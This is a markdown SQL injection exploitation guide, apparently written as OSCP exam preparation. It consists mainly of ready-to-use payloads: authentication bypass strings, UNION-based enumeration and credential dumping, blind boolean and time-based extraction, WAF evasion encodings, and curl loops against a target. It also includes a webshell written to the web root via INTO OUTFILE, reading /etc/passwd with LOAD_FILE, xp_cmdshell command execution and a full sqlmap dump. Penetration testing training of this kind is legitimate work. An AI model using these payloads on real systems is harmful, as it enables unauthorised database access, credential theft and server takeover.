# SQL Injection Manual Exploitation Guide

## Table of Contents
1. [PHP Superglobals and Input Handling](#php-superglobals-and-input-handling)
2. [Authentication Bypass](#authentication-bypass)
3. [UNION-Based SQL Injection](#union-based-sql-injection)
4. [Blind SQL Injection](#blind-sql-injection)
5. [Database Variations](#database-variations)
6. [Attack Methodology](#attack-methodology)
7. [Troubleshooting Guide](#troubleshooting-guide)
8. [OSCP Exam Reference](#oscp-exam-reference)

---

## PHP Superglobals and Input Handling

### Understanding PHP Predefined Variables

PHP provides **superglobals** - built-in variables available in all scopes that capture external input and environment information. These are the primary attack vectors for SQL injection.

#### Key Superglobals for SQL Injection

| Superglobal | Description | SQL Injection Risk | Example |
|------------|-------------|-------------------|---------|
| **$_GET** | HTTP GET variables from URL parameters | High - Visible in URL | `?id=1' OR 1=1--` |
| **$_POST** | HTTP POST variables from forms | High - Hidden in request body | Form fields |
| **$_REQUEST** | Combined GET, POST, and COOKIE | Very High - Multiple vectors | Any input method |
| **$_COOKIE** | HTTP Cookie values | Medium - Persistent storage | Session tokens |
| **$_SERVER** | Server and environment info | Low - Some headers | User-Agent, Referer |

### Vulnerable PHP Code Patterns

```php
// VULNERABLE: Direct concatenation
$query = "SELECT * FROM users WHERE username = '".$_POST['uid']."'
          AND password = '".$_POST['password']."'";

// VULNERABLE: Using $_REQUEST (accepts GET or POST)
$search = $_REQUEST['search_input'];
$query = "SELECT * FROM customers WHERE name LIKE '".$search."%'";

// VULNERABLE: Insufficient escaping
$id = $_GET['user'];
$query = "SELECT * FROM profiles WHERE user_id = $id";

// SECURE: Prepared statements (for reference)
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
$stmt->execute([$_POST['uid']]);
```

---

## Authentication Bypass

### Attack Vector: Login Forms

**Target**: Login pages using SQL queries to validate credentials

### Vulnerable Query Pattern
```sql
SELECT * FROM users
WHERE username = '$_POST[uid]'
AND password = '$_POST[password]'
```

### Exploitation Techniques

#### 1. Classic OR Bypass
```sql
-- Input in username field:
admin' OR '1'='1' --

-- Resulting query:
SELECT * FROM users WHERE username = 'admin' OR '1'='1' -- ' AND password = ''
-- Always returns TRUE, bypassing authentication
```

#### 2. Comment-Based Bypass
```sql
-- Input variations:
admin' --
admin' #
admin'/*

-- Resulting query:
SELECT * FROM users WHERE username = 'admin' -- ' AND password = ''
-- Password check is commented out
```

#### 3. UNION-Based Login Bypass
```sql
-- Input:
' UNION SELECT 1,'admin','password_hash' --

-- Creates fake admin record in result set
```

### Testing Methodology

1. **Identify Input Parameters**
```bash
# Check form fields
curl -s http://$TARGET/login.php | grep -i "input"
# Look for: name="uid", name="password", name="username", etc.
```

2. **Test Basic Payloads**
```bash
# POST request with SQL injection
curl -X POST http://$TARGET/index.php \
  -d "uid=admin' OR '1'='1' -- &password=anything"

# URL-encoded version
curl -X POST http://$TARGET/login.php \
  -d "uid=admin%27%20OR%20%271%27%3D%271%27%20--%20&password=test"
```

3. **Verify Success Indicators**
- Redirect to dashboard/home page
- Welcome message with username
- Session cookie creation
- Absence of "Invalid credentials" error

---

## UNION-Based SQL Injection

### Prerequisites for UNION Attacks

1. **Same number of columns** in both queries
2. **Compatible data types** between corresponding columns
3. **Results must be displayed** (in-band SQLi)

### Attack Chain

#### Step 1: Column Enumeration
```sql
-- Increment until error occurs
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
...
' ORDER BY 6-- // Error: Unknown column '6'
-- Conclusion: 5 columns exist
```

#### Step 2: Identify Injectable Columns
```sql
-- Test which columns are displayed
' UNION SELECT 'a1','a2','a3','a4','a5'--

-- Look for a1, a2, etc. in output to map positions
-- Note: First column often hidden (ID field)
```

#### Step 3: Database Enumeration
```sql
-- Basic information gathering
' UNION SELECT null, database(), user(), @@version, null--

-- Current database: offsec
-- User: root@172.30.0.3
-- Version: 8.0.28
```

#### Step 4: Schema Enumeration
```sql
-- List all tables in current database
' UNION SELECT null, table_name, null, null, null
  FROM information_schema.tables
  WHERE table_schema = database()--

-- List columns for specific table
' UNION SELECT null, column_name, null, null, null
  FROM information_schema.columns
  WHERE table_name = 'users'--
```

#### Step 5: Data Extraction
```sql
-- Dump user credentials
' UNION SELECT null, username, password, email, null
  FROM users--

-- Combine multiple columns
' UNION SELECT null, CONCAT(username,':',password), null, null, null
  FROM users--
```

### Advanced UNION Techniques

```sql
-- Reading files (MySQL with FILE privilege)
' UNION SELECT null, LOAD_FILE('/etc/passwd'), null, null, null--

-- Writing webshells (dangerous, requires FILE privilege)
' UNION SELECT null, '<?php system($_GET["cmd"]); ?>', null, null, null
  INTO OUTFILE '/var/www/html/shell.php'--
```

---

## Blind SQL Injection

### Boolean-Based Blind SQLi

**Concept**: Infer data by observing TRUE/FALSE responses

#### Testing Methodology
```sql
-- Baseline TRUE condition
?user=offsec' AND 1=1-- // Normal response

-- Baseline FALSE condition
?user=offsec' AND 1=2-- // Different/error response

-- Extract database name character by character
?user=offsec' AND SUBSTRING(database(),1,1)='o'-- // TRUE
?user=offsec' AND SUBSTRING(database(),1,1)='p'-- // FALSE
```

#### Automated Extraction Script Logic
```python
# Pseudo-code for boolean-based extraction
charset = "abcdefghijklmnopqrstuvwxyz0123456789_"
extracted = ""

for position in range(1, 50):
    for char in charset:
        payload = f"' AND SUBSTRING(database(),{position},1)='{char}'--"
        if response_indicates_true(payload):
            extracted += char
            break
```

### Time-Based Blind SQLi

**Concept**: Infer data through deliberate delays

#### MySQL Time-Based Payloads
```sql
-- Basic sleep test
' AND SLEEP(5)--

-- Conditional sleep
' AND IF(1=1, SLEEP(5), 0)--

-- Extract data with timing
' AND IF(SUBSTRING(database(),1,1)='o', SLEEP(3), 0)--
```

#### MSSQL Time-Based Payloads
```sql
-- WAITFOR DELAY
'; WAITFOR DELAY '00:00:05'--

-- Conditional delay
'; IF (1=1) WAITFOR DELAY '00:00:05'--
```

#### PostgreSQL Time-Based Payloads
```sql
-- pg_sleep
' AND pg_sleep(5)--

-- Conditional sleep
' AND CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
```

### Testing Blind SQLi
```bash
# Measure response time for time-based
time curl -s "http://$TARGET/page.php?id=1' AND SLEEP(5)--" > /dev/null

# Compare responses for boolean-based
diff <(curl -s "http://$TARGET/page.php?id=1' AND 1=1--") \
     <(curl -s "http://$TARGET/page.php?id=1' AND 1=2--")
```

---

## Database Variations

### MySQL/MariaDB Specifics

```sql
-- Version detection
SELECT @@version;
SELECT VERSION();

-- Current database
SELECT DATABASE();

-- User enumeration
SELECT user FROM mysql.user;

-- Comment styles
# Hash comment
-- Double dash comment
/* Multi-line comment */

-- String concatenation
SELECT CONCAT('a','b');

-- Substring
SELECT SUBSTRING('text',1,2);
SELECT SUBSTR('text',1,2);
SELECT MID('text',1,2);

-- Conditional statements
SELECT IF(1=1,'true','false');
SELECT CASE WHEN 1=1 THEN 'true' ELSE 'false' END;

-- Time delay
SELECT SLEEP(5);
SELECT BENCHMARK(10000000,SHA1('test'));
```

### MSSQL Specifics

```sql
-- Version detection
SELECT @@version;

-- Current database
SELECT DB_NAME();

-- User enumeration
SELECT name FROM master.sys.sql_logins;
SELECT name FROM master.dbo.sysusers;

-- Comment styles
-- Double dash comment
/* Multi-line comment */

-- String concatenation
SELECT 'a' + 'b';

-- Substring
SELECT SUBSTRING('text',1,2);

-- Conditional statements
SELECT CASE WHEN 1=1 THEN 'true' ELSE 'false' END;

-- Time delay
WAITFOR DELAY '00:00:05';

-- Error-based extraction (xp_cmdshell)
EXEC xp_cmdshell 'whoami';
```

### PostgreSQL Specifics

```sql
-- Version detection
SELECT version();

-- Current database
SELECT current_database();

-- User enumeration
SELECT usename FROM pg_user;

-- Comment styles
-- Double dash comment
/* Multi-line comment */

-- String concatenation
SELECT 'a' || 'b';

-- Substring
SELECT SUBSTRING('text' FROM 1 FOR 2);

-- Conditional statements
SELECT CASE WHEN 1=1 THEN 'true' ELSE 'false' END;

-- Time delay
SELECT pg_sleep(5);

-- Error-based extraction
SELECT CAST((SELECT version()) AS INT);
```

### Oracle Specifics

```sql
-- Version detection
SELECT * FROM v$version;

-- Current database
SELECT global_name FROM global_name;

-- User enumeration
SELECT username FROM all_users;

-- Comment styles
-- Double dash comment

-- String concatenation
SELECT 'a' || 'b' FROM dual;

-- Substring
SELECT SUBSTR('text',1,2) FROM dual;

-- Conditional statements
SELECT CASE WHEN 1=1 THEN 'true' ELSE 'false' END FROM dual;

-- Time delay (requires DBMS_LOCK)
SELECT DBMS_LOCK.SLEEP(5) FROM dual;

-- Note: Oracle requires FROM dual for SELECT statements
```

---

## Attack Methodology

### Systematic SQLi Testing Framework

```
1. RECONNAISSANCE
   ├── Identify input parameters ($_GET, $_POST, $_COOKIE)
   ├── Determine backend database type
   └── Check for WAF/filtering

2. INJECTION POINT DISCOVERY
   ├── Test with single quotes (')
   ├── Test with SQL operators (AND, OR)
   └── Observe error messages

3. EXPLOITATION TECHNIQUE SELECTION
   ├── In-band (UNION-based)
   │   ├── Column count enumeration
   │   ├── Data type identification
   │   └── Data extraction
   ├── Blind (Boolean-based)
   │   ├── TRUE/FALSE response mapping
   │   └── Character-by-character extraction
   └── Blind (Time-based)
       ├── Delay confirmation
       └── Conditional timing extraction

4. DATA EXTRACTION
   ├── Database enumeration
   ├── Table/Column discovery
   ├── Credential harvesting
   └── File system access (if privileged)

5. POST-EXPLOITATION
   ├── Password cracking (if hashed)
   ├── Privilege escalation
   └── Webshell deployment (if possible)
```

### Quick Testing Checklist

```bash
# 1. Error-based detection
'
"
\
')
")

# 2. Boolean logic testing
' OR '1'='1
' OR '1'='2
' AND '1'='1
' AND '1'='2

# 3. Time-based detection
' AND SLEEP(5)--
'; WAITFOR DELAY '00:00:05'--
' AND pg_sleep(5)--

# 4. UNION discovery
' ORDER BY 1--
' UNION SELECT null--
' UNION SELECT 1,2,3--

# 5. Comment termination
--
#
/*
-- -
;%00
```

---

## Troubleshooting Guide

### Common Issues and Solutions

#### Issue: No Visible SQL Errors
**Solution**: Switch to blind SQLi techniques
```sql
-- Try time-based
' AND SLEEP(5)--

-- Try boolean-based with obvious conditions
' AND 1=1--
' AND 1=2--
```

#### Issue: WAF Blocking Requests
**Solution**: Use encoding and obfuscation
```sql
-- URL encoding
%27%20UNION%20SELECT%20null--

-- Double URL encoding
%2527%20UNION%20SELECT%20null--

-- Case variation
' uNiOn SeLeCt null--

-- Comment variations
' UNION/**/SELECT/**/null--

-- Using backticks (MySQL)
' UNION SELECT `column` FROM `table`--
```

#### Issue: Column Count Mismatch
**Solution**: Systematic enumeration
```bash
# Automated column count detection
for i in {1..20}; do
    response=$(curl -s "http://$TARGET/page.php?id=' ORDER BY $i--")
    if [[ $response == *"error"* ]]; then
        echo "Column count: $((i-1))"
        break
    fi
done
```

#### Issue: Data Type Mismatch in UNION
**Solution**: Use NULL or compatible types
```sql
-- Start with all NULLs
' UNION SELECT NULL,NULL,NULL,NULL,NULL--

-- Gradually replace with strings
' UNION SELECT 'test',NULL,NULL,NULL,NULL--
' UNION SELECT NULL,'test',NULL,NULL,NULL--

-- For numeric columns
' UNION SELECT 1,2,3,4,5--
```

#### Issue: Limited Output Space
**Solution**: Use concatenation
```sql
-- MySQL
' UNION SELECT CONCAT(username,':',password,':',email)--

-- MSSQL
' UNION SELECT username+':'+password+':'+email--

-- PostgreSQL
' UNION SELECT username||':'||password||':'||email--
```

---

## OSCP Exam Reference

### Time-Efficient SQLi Strategy

1. **Quick Win Attempts (5 minutes)**
```bash
# Authentication bypass
admin' OR '1'='1'--
admin'--

# Basic UNION
' UNION SELECT null,null,null--
' UNION SELECT 1,2,3--
```

2. **Systematic Testing (10 minutes)**
```bash
# Column enumeration
' ORDER BY 1--  through N

# UNION mapping
' UNION SELECT 'a','b','c'...

# Database extraction
' UNION SELECT database(),user(),@@version--
```

3. **Automation Fallback (if manual fails)**
```bash
# Use sqlmap for complex scenarios
sqlmap -u "http://$TARGET/page.php?id=1" \
       --batch --risk=3 --level=5 \
       --technique=BEUST --threads=10 \
       --dump
```

### Essential Payloads Cheatsheet

```sql
-- MySQL/MariaDB
' OR 1=1--
' UNION SELECT null,database(),user()--
' AND SLEEP(5)--
' UNION SELECT null,LOAD_FILE('/etc/passwd'),null--

-- MSSQL
' OR 1=1--
' UNION SELECT null,DB_NAME(),SYSTEM_USER--
'; WAITFOR DELAY '00:00:05'--
'; EXEC xp_cmdshell 'whoami'--

-- PostgreSQL
' OR 1=1--
' UNION SELECT null,current_database(),current_user--
' AND pg_sleep(5)--
' UNION SELECT null,version(),null--
```

### Documentation Template

```markdown
## Target: [IP/URL]
## Vulnerable Parameter: $_POST['uid']
## Database Type: MySQL 8.0.28
## Injection Type: UNION-based

### Working Payload:
' UNION SELECT null,username,password,null,null FROM users--

### Extracted Data:
- admin:5f4dcc3b5aa765d61d8327deb882cf99 (MD5)
- offsec:lab

### Notes:
- 5 columns in original query
- Column 1 not displayed (likely ID)
- FILE privilege available
```

---

## Summary

SQL injection remains one of the most critical web vulnerabilities. Success depends on:

1. **Understanding PHP superglobals** and how user input flows into queries
2. **Systematic enumeration** to determine database structure
3. **Adapting techniques** based on database type and response behavior
4. **Persistence** in trying different encoding and bypass methods

Remember: In the OSCP exam, manual SQL injection skills are essential. While tools like sqlmap are powerful, understanding the underlying techniques ensures success when automation fails.

---

*Last Updated: SQL Injection Manual Exploitation Techniques*